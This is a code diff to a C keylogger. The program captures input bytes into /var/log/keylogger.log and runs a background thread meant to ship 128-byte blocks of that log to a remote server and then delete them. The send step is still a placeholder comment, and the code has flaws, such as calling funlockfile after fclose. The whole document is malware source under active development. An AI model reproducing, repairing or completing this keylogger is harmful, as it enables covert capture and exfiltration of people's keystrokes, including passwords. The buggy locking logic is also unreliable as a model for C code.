@@ -4,6 +4,7 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <sys/select.h>
+#include <sys/file.h>
 #include <string.h>
 
 #ifndef FALLOC_FL_COLLAPSE_RANGE
@@ -12,7 +13,7 @@
 
 #define BUFFER_SIZE 128
 
-typedef struct address
+struct address
 {
     char *host;
     int port;
@@ -26,56 +27,86 @@ int connect(char *host, int port)
     return -1;
 }
 
-void sendToServer(void *args)
+void * sendToServer(void *args)
 {
-    struct address addr = (struct address) *args;
-    int connected = 0;
+    struct address *addr = (struct address *) args;
+    int connected = 1;
     unsigned char buffer[BUFFER_SIZE];
 
-    printf("Startuje\n");
+    printf("Thread starts\n");
     while(1)
     {
+        sleep(10);
+
         if (connected)
         {
-            /* we are connected to server send log file*/
-            pthread_mutex_lock(&mutex);
-            int fd = open("/var/log/keylogger.log", O_CREAT | O_TRUNC | O_RDWR, 0644);
+            /* we are connected to server send log file */
+            FILE *file;
+            if ((file = fopen("/var/log/keylogger.log", "r")) == NULL)
+            {
+                /* log file doesn't exist */
+                continue;
+            }
+
+            flockfile(file);
+
+            fseek(file, 0, SEEK_END);
+            if (ftell(file) < BUFFER_SIZE)
+            {
+                /* log file is not big enough */
+                fclose(file);
+                continue;
+            }
+            fseek(file, 0, SEEK_SET);
+
             int readBytes = 0;
             while (readBytes < BUFFER_SIZE)
             {
-                readBytes += read(fd, buffer + readBytes, BUFFER_SIZE - readBytes)
+                readBytes += fread(buffer + readBytes, 1, BUFFER_SIZE - readBytes, file);
             }
-            fclose(fd);
-            pthread_mutex_unlock(&mutex);
+
+            fclose(file);
+            funlockfile(file);
+
             /* send buffer to server */
+            printf("Bytes ready to send %d\n", readBytes);
 
             /* if send succeeded delete block of data in log file */
-            pthread_mutex_lock(&mutex);
-            fallocate(fd, FALLOC_FL_COLLAPSE_RANGE, 0, BUFFER_SIZE);
-            pthread_mutex_unlock(&mutex);
+            file = fopen("/var/log/keylogger.log", "r");
+            FILE *tmp_file = fopen("/var/log/keylogger.log~", "w");
+            flockfile(file);
+            fseek(file, BUFFER_SIZE, 0);
+            int c;
+            while((c = fgetc(file)) != EOF)
+            {
+                fputc(c, tmp_file);
+            }
+            fclose(tmp_file);
+            fclose(file);
+            unlink("/var/log/keylogger.log");
+            rename("/var/log/keylogger.log~", "/var/log/keylogger.log");
+            funlockfile(file);
             /* if send does not succeeded leave file as it was and set connected to 0 */
         }
-        else if (connect(char *host, int port) == 0)
+        else if (connect(addr->host, addr->port) == 0)
         {
             connected = 1;
         }
-
-        sleep(5)
     }
 }
 
 void logToFile(unsigned char *buffer, int *currentSize)
 {
-    pthread_mutex_lock(&mutex);
     FILE *file  = fopen("/var/log/keylogger.log", "a+");
+    flockfile(file);
     int writtenBytes = 0;
     while (*currentSize - writtenBytes > 0)
     {
-        writtenBytes += fwrite(buffer + writtenBytes, 1, *currentSize - writtenBytes, file)
+        writtenBytes += fwrite(buffer + writtenBytes, 1, *currentSize - writtenBytes, file);
     }
-    *currentSize = 0
+    *currentSize = 0;
     fclose(file);
-    pthread_mutex_unlock(&mutex);
+    funlockfile(file);
 }
 
 
@@ -123,8 +154,8 @@ int main(int argc, char *argv[])
         printf("Read %d bytes\n", readBytes);
 
         if (currentSize == BUFFER_SIZE)
-         {
-             logToFile(buffer, &currentSize);
-         }
+        {
+            logToFile(buffer, &currentSize);
+        }
     }
 }
